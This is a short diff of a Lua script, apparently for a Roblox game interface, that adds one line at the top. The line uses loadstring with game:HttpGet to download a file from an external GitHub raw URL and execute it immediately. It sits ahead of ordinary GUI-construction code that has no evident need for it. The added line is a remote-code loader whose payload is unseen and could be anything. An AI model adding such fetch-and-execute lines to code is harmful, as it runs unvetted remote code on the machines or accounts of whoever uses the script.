@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
 local main = Instance.new("ScreenGui")
 local top = Instance.new("Frame")
 local back = Instance.new("Frame")
